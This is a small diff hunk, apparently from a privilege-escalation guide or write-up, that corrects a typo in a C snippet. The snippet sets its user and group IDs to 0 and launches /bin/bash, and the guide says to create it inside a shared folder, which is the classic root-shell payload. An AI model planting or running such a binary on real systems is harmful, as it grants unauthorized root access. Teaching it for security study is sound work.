@@ -174,7 +174,7 @@ Create file inside shared:
 ```c
 int main(){
         setgid(0);
-        setudi(0);
+        setuid(0);
         system("/bin/bash");
         return 0;
 }
